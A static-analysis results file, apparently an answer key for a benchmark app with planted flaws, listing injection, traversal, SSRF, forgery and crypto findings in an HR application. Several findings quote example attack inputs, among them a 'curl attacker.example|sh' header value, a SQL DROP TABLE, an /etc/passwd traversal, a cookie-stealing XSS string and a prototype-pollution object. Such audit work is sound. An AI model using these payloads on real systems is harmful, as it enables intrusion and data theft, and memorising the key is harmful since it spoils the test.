@@ -1,0 +1,661 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.handlebars-server-side-template-injection",
+      "path": "app/lib/printouts.server.ts",
+      "start": {
+        "line": 73,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 83,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderAcknowledgementCertificatePrintout interpolates policyTitle, version, and the caller-supplied closingNote directly into the Handlebars TEMPLATE SOURCE STRING before Handlebars.compile() is called (line 82). closingNote comes from the unauthenticated-format query parameter `note` in app/routes/app.policies.ack.$id.tsx (`url.searchParams.get('note')`). Because the value becomes part of the template rather than being passed as render data, an attacker-controlled note containing Handlebars syntax (e.g. helpers or `{{#with}}` / `constructor` gadget chains) is evaluated as template code, allowing server-side template injection and potential remote code execution. Contrast with the safe sibling `renderDocumentHandoffReceipt` a few lines below, which precompiles a literal template once and only ever passes user data as render-time data (safely escaped).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.function-constructor-code-injection",
+      "path": "app/lib/compPresets.server.ts",
+      "start": {
+        "line": 56,
+        "col": 19,
+        "offset": 0
+      },
+      "end": {
+        "line": 56,
+        "col": 108,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewProratedStartingPay builds `new Function('principal', 'days', 'return ' + formula)` where `formula` is taken verbatim from the `formula` query parameter in app/routes/app.compensation.proration-preview.tsx and executed server-side. Any authenticated payroll_specialist/hr_admin can submit arbitrary JavaScript (e.g. `require('child_process').execSync(...)` via global access, or simple exfiltration) which runs in the Node process. Compare to the safe sibling `previewProratedAdjustment`, which only selects from a fixed PRORATION_FORMULAS map.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.shell-command-injection-soffice",
+      "path": "app/lib/exportArchive.server.ts",
+      "start": {
+        "line": 36,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 45,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertArchivedExportToFormat builds a shell command string `soffice --headless --convert-to ${outputPreset} --outdir ${ARCHIVE_DIR} ${srcPath}` and runs it via `spawn(command, [], { shell: true })`. Both `outputPreset` (URL path segment `$preset`) and `fileName`/`run` (query parameter, joined unsanitized into srcPath) are attacker-controlled, as wired up in app/routes/app.admin.exports.convert.$preset.tsx. An hr_admin-reachable request such as `preset=xlsx;id` or a run value containing shell metacharacters achieves arbitrary OS command execution. Contrast with the safe sibling `convertVendorReceiptToFormat` in vendorPay.server.ts, which validates the preset against an allowlist and calls `spawn` with `shell:false` and discrete arguments.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.execsync-command-injection-pandoc",
+      "path": "app/lib/policyBinder.server.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 67,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderPolicyForBindery runs `execSync(\\`pandoc ${srcPath} --to=${layoutProfile} -o ${outPath}\\`)`, and `layoutProfile` is taken directly and unvalidated from the `x-bindery-profile` request header in app/routes/app.policies.$id.bindery.tsx (`request.headers.get('x-bindery-profile') || 'plain'`). Any hr_admin request (or anyone who can reach this endpoint) can set that header to a value containing shell metacharacters (e.g. `plain; curl attacker.example|sh`) to execute arbitrary OS commands. Contrast with the safe sibling `renderOnboardingPacketForBindery`, which validates the profile against BINDERY_LAYOUT_PROFILES and calls `spawnSync` with `shell:false`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.missing-signature-verification-carrier-assertion",
+      "path": "app/lib/carrierAssertion.server.ts",
+      "start": {
+        "line": 27,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readCarrierAssertion splits the bearer token on '.' and JSON.parses the middle (payload) segment WITHOUT ever verifying a signature, unlike its sibling verifyDisbursementAssertion which HMAC-verifies the token before trusting claims. It is used directly by app/routes/api.v1.requests.$id.eligibility-sync.tsx to accept `decision`/`tier` claims for the carrier-eligibility webhook. Any caller can forge a 3-part dot-separated token (`base64(header).base64({\"decision\":\"approved\",\"tier\":\"x\",\"employeeId\":1}).anything`) to move an arbitrary benefits HR request to \"resolved\" without any real carrier involvement \u2014 a full authentication/authorization bypass for that business workflow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-raw-order-by-injection",
+      "path": "app/lib/queries.server.ts",
+      "start": {
+        "line": 64,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 70,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "rankCompensationBandBySortField interpolates the caller-supplied `sortField` directly into a raw SQL fragment via `sql.raw(sortField)` inside an ORDER BY clause. It is called from app/routes/app.compensation.benchmark.tsx with `sortBy` taken verbatim from the `sortBy` GET query parameter with no validation, so any manager/hr_admin can inject arbitrary SQL (e.g. `1); DROP TABLE employees;--` or UNION-based data exfiltration via a crafted ORDER BY expression) that is executed by db.execute. Contrast with the safe sibling `teamRosterSortColumn`, which only ever selects from a fixed TEAM_ROSTER_SORT_COLUMNS map.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.archived-export-read",
+      "path": "app/lib/exportArchive.server.ts",
+      "start": {
+        "line": 26,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readArchivedExportRun joins the caller-supplied `fileName` directly into the archive directory path with no normalization/containment check, unlike its sibling readRetentionSnapshot a few lines below which resolves the path and verifies it stays inside RETENTION_DIR. It is called from app/routes/app.admin.exports.archive.$run.tsx with `params.run` taken straight from the URL. A value such as `..%2f..%2f..%2fetc%2fpasswd` (percent-encoded so it survives as a single Remix route segment) can escape ARCHIVE_DIR and read arbitrary files readable by the server process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.xml2js-unrestricted-parse",
+      "path": "app/lib/kiosk.server.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "parseCachedRosterSnapshot feeds attacker-suppliable XML straight into xml2js's Parser with no DOCTYPE/entity guard. It is reached, unauthenticated, from the kiosk.punch.tsx loader via the client-supplied `hrp_station_cache` cookie (base64-decoded then parsed). Contrast with the safe sibling `parseSupervisorRosterCache` just below, which explicitly rejects any input containing `<!DOCTYPE` before parsing \u2014 confirming the omission here is the vulnerable path (XXE / entity-expansion DoS) for the terminal-facing endpoint.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-kiosk-lookup",
+      "path": "app/lib/kiosk.server.ts",
+      "start": {
+        "line": 76,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 84,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findRosterEntryByTypedName builds an XPath expression by directly concatenating the caller-supplied `typedName` into the query string (`contains(..., '${typedName.toLowerCase()}')`) with no escaping, then evaluates it with `doc.evaluate`. It is reached from app/routes/kiosk.directory.tsx via the `name` GET parameter, gated only by a client-supplied `x-station-id` header (not real authentication). An attacker can break out of the string literal (e.g. `') or contains(email,'a` or boolean-injection payloads) to alter query logic and blind-extract other employees' roster data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.employee-profile-card-full-row-exposure",
+      "path": "app/routes/api.v1.employees.$id.tsx",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "fetchEmployeeProfileCard returns the FULL employees row (`db.query.employees.findFirst`, no column selection) for any id, and the loader only requires `requireUser` (any authenticated role, including a plain employee) with no ownership/manager check. This exposes ssnLast4, address, phone, and internalNote (an HR-only field per authz.server.ts's canViewInternalNotes) for ANY other employee to ANY signed-in user \u2014 the doc comment even states \"Any signed-in user can look up any employee by id\", but the response includes far more than the \"quick view card\" (name/title) the comment implies, bypassing the loadViewableEmployee/visibleDocCategories scoping used everywhere else in the app.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-self-request-edit",
+      "path": "app/routes/app.requests.$id.tsx",
+      "start": {
+        "line": 95,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 104,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `intent === \"edit\"` action strips only the `intent` key and forwards every other posted form field (`const { intent: _intent, ...fields } = form`) to applySelfRequestEdit, which merges them verbatim (`{...fields, updatedAt}`) into the hrRequests row via Drizzle `.set()`. The rendered form only shows a `subject` input, but nothing prevents a requesting employee (only check is `emp.userId === user.id`) from POSTing extra fields such as `status=resolved`, `assignedToId`, `category`, or `employeeId` directly, bypassing the staff-only status-change gate a few lines above (`intent === \"status\"` requires `isStaff`) and the whole HR triage workflow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-cost-of-living-preset",
+      "path": "app/lib/compPresets.server.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyCostOfLivingPreset JSON.parses the entire `presetPayload` and merges it wholesale (`{...preset, updatedAt}`) into the compensationRequests row via Drizzle `.set()`, with no schema restricting which fields may be set. It is reachable via GET from app/routes/app.compensation.$id.apply-preset.tsx with the `preset` query parameter fully attacker-controlled. A payroll_specialist can pass `?preset={\"status\":\"effective\"}` to instantly move a compensation request to \"effective\" \u2014 skipping the manager_approved/hr_approved workflow stages and the CSRF mutation-ticket check enforced by the proper `transitionCompensationRequest` action. Contrast with the safe sibling `applyStartingPreset`, which validates the payload against a `.strict()` zod schema listing only the fields a preset may touch.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-external-request-update",
+      "path": "app/lib/ticketing.server.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyExternalRequestUpdate merges the entire connector-supplied JSON payload (`{...payload, updatedAt}`) directly into the hrRequests row with no field allowlist, unlike the schema-validated `createExternalRequestComment`/`applyExternalLedgerAck` in the same file. It is invoked from api.v1.requests.$id.tsx after only an API-key check, so any holder of a valid (non-admin-scoped) integration key can overwrite arbitrary columns on any HR request \u2014 including `status`, `employeeId`, or `assignedToId` \u2014 not just the fields a ticketing sync should ever touch.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.import-policy-content-fetch",
+      "path": "app/lib/ticketing.server.ts",
+      "start": {
+        "line": 98,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 102,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importPolicyContent performs `fetch(sourceUrl)` on a caller-supplied URL validated only with zod's generic `.url()` (any scheme/host, no allowlist). It is exposed via the `intent===\"import\"` action in app/routes/app.admin.policies.tsx, letting an hr_admin (or anyone who can reach this action) make the server issue requests to internal-only hosts or cloud metadata endpoints (e.g. `http://169.254.169.254/latest/meta-data/`) and have the response body reflected back in the JSON response. Contrast with the safe sibling `testWebhookEndpoint`, which restricts targets to ALLOWED_WEBHOOK_HOSTS.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.prototype-pollution.export-runner-preferences-object-assign",
+      "path": "app/lib/opsSettings.server.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyExportRunnerPreferences calls `Object.assign(exportRunnerPreferences, overrides)` with `overrides` being `JSON.parse`d directly from the client-supplied `x-export-preferences` header (see syncExportRunnerPreferences in app/routes/app.admin.audit.tsx, invoked at the top of that route's action for any hr_admin request). A payload such as `{\"__proto__\":{\"polluted\":true}}` creates an own `__proto__` property whose assignment via Object.assign invokes the setter and pollutes `Object.prototype` process-wide, corrupting behavior across the whole application. Contrast with the safe sibling `applyWebhookDispatchPreferences`, which only copies keys present in ALLOWED_DISPATCH_KEYS.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.forged-header-premium-compensation-disclosure",
+      "path": "app/lib/marketDataVendor.server.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 35,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readMarketDataAvailability/premiumBandsRequestedSeats trust a client-supplied, unsigned `x-marketdata-availability` header (base64 JSON, loose `==` comparison, truthy-only `access` check) to decide how many company-wide top-salary rows to return. app/routes/app.compensation.benchmark.tsx (loader lines 62-77) feeds this straight through for any manager or hr_admin request, returning `premiumRows` drawn from ALL departments company-wide via a query with no department/report-scope filter at all \u2014 bypassing the manager-scoped `employeeScopeFilter` used everywhere else. A manager can simply send a crafted header (`base64({\"planTier\":\"enterprise\",\"seatCount\":\"9999\",\"access\":\"x\"})`) to view top salaries for employees far outside their direct reports. Contrast with the safe sibling `premiumBandsRequestedSeatsStrict` used by app/routes/app.compensation._index.tsx, which validates each field's real type/value.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-document-cover-sheet",
+      "path": "app/lib/printouts.server.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderDocumentCoverSheet interpolates `doc.title` and `doc.originalName` directly into HTML (title/h1/p tags) and, most seriously, into an inline `<script>` string literal (`var coverSheetTitle = \"${doc.title}\";`) with no escaping. `doc.title` is set by any user uploading a document (app/routes/app.documents._index.tsx, `title` form field, up to 200 chars, no HTML/JS sanitization) and is reachable, unauthenticated by content but requiring doc-viewer permission, via app/routes/app.documents.$id.cover.tsx and app.documents.$id.widget.tsx. An uploaded title such as `x\\\";alert(document.cookie)+opener.postMessage(1,'*');//` breaks out of the script string and executes arbitrary JS in the viewer's session (stored XSS). Contrast with the safe sibling `renderPolicyCoverSheet` in the same file, which uses `escapeForHtml` on every interpolated field.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.letterhead-upload-filename",
+      "path": "app/lib/branding.server.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveDepartmentLetterhead builds `fileName = deptCode + '-' + file.name` and writes it with `fs.writeFileSync(path.join(BRANDING_DIR, fileName), buffer)` with no sanitization of `file.name` (the client-supplied original filename). A crafted upload filename containing `../` sequences can make `path.join` resolve outside `public/branding`, allowing an hr_admin-reachable upload (app/routes/app.admin.departments.tsx, intent=\"letterhead\") to write an arbitrary file to any path the Node process can write to (or, if kept inside `public/branding`, plant an attacker-chosen file that the public-facing static server will serve).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-directory-search",
+      "path": "app/lib/directory.server.ts",
+      "start": {
+        "line": 56,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 59,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queryEmployeeDirectory builds the LDAP filter `(cn=*${searchTerm}*)` by directly concatenating the caller-supplied search term with no escaping, then evaluates it against the directory. It is reached from app/routes/app.admin.directory-sync.tsx via the `q` GET parameter. A crafted term such as `*)(uid=*` or similar can widen or otherwise manipulate the filter beyond the intended `cn` substring match. Contrast with the safe sibling `findUserByEmail`, which runs the value through `escapeLdapFilterValue` before building its filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-vendor-bearer-token",
+      "path": "app/lib/vendorPay.server.ts",
+      "start": {
+        "line": 111,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 119,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "notifyEquityVendor hardcodes a live-looking bearer token (`Authorization: \"Bearer cq_live_7f2a9d4e1b6c8038f5a2d9e0c1b4a7f6d3e8c2b1\"`) directly in source rather than reading it from an environment variable (as every other vendor integration in this file does, e.g. RELOCATION_PROVIDER_KEY/BENEFITS_CARRIER_KEY). Anyone with source access (or a leaked build artifact) obtains a credential usable against the equity vendor's live API.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.relocation-voucher-missing-integrity-check",
+      "path": "app/lib/vendorPay.server.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "decryptRelocationVoucher decrypts finance-facing payout vouchers with AES-256-CBC and no MAC/authentication tag, then surfaces a distinguishable error message (\"Voucher padding is invalid.\") specifically when PKCS#7 padding fails. This combination allows an attacker who can submit crafted ciphertext (the voucher is pasted back in via a hidden form field per the code comment) to both tamper with plaintext fields (accountLast4/amount) undetected and use the differentiated error as a padding-oracle side channel to decrypt or forge vouchers. Contrast with the safe sibling `decryptEquityVoucher`, which uses AES-256-GCM (authenticated) and returns one generic error regardless of failure cause.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-353: Missing Support for Integrity Check",
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.insecure-randomness-punch-override-code",
+      "path": "app/lib/kiosk.server.ts",
+      "start": {
+        "line": 95,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 101,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "issuePunchOverrideCode generates the 6-digit badge-in override code with `Math.floor(Math.random() * 1000000)`, a non-cryptographic PRNG, for a code that lets an employee authenticate at the shared kiosk without their PIN (consumed by kiosk.punch.tsx's `override.confirm` intent, with no attempt-rate-limiting visible on `consumePunchOverrideCode`). Contrast with the safe sibling `issueStationPairingCode`, which uses `crypto.randomInt` for an analogous one-time code.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.unconditional-stack-trace-team-summary",
+      "path": "app/routes/app.employees.team-summary.tsx",
+      "start": {
+        "line": 46,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadTeamCompensationSummary's catch block unconditionally throws `json({ error: ..., stack: error.stack }, {status:500})` to any manager who triggers a query error \u2014 no environment gate at all, unlike the sibling onboarding-history.tsx handler which only includes error detail when `NODE_ENV === 'development'`. This leaks internal stack traces (file paths, code structure) to any authenticated manager.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.header-gated-stack-trace-pay-history",
+      "path": "app/routes/app.employees.$id.pay-history.tsx",
+      "start": {
+        "line": 36,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 44,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The pay-history loader returns the raw error message, stack trace, and an interpolated SQL-like query string whenever the client sends `x-ops-channel: field-office-diagnostics` \u2014 a value fully controlled by the requester, not an environment or role check. Any authenticated user permitted to view compensation for an employee can trigger this by simply adding the header, causing an internal error to leak stack traces regardless of deployment environment.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.cors-reflect-arbitrary-origin",
+      "path": "app/routes/api.v1.employees.tsx",
+      "start": {
+        "line": 53,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 56,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The employee-directory API reflects whatever `Origin` header the caller sends back as `Access-Control-Allow-Origin` with no allowlist, unlike the sibling api.v1.requests.$id.comments.tsx which checks the origin against ALLOWED_PARTNER_ORIGINS before reflecting it. Any web page can read this endpoint's response cross-origin from a browser that already holds a valid API key (e.g. via an XHR with the key attached), since the reflected origin combined with no allowlist defeats the same-origin policy for this response.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.debug-flag-disables-frame-protection",
+      "path": "app/routes/app.policies.$id.widget.tsx",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "policyWidgetHeaders removes the `X-Frame-Options` header entirely and sets `Content-Security-Policy: frame-ancestors *` whenever `process.env.DEBUG_MODE === 'true'`, allowing the policy content to be embedded in an iframe on ANY origin (clickjacking) instead of only the trusted LMS. If this debug flag is ever left enabled in a shared/staging or production environment, it removes frame-protection app-wide for this route.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendered UI Layers or Frames"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
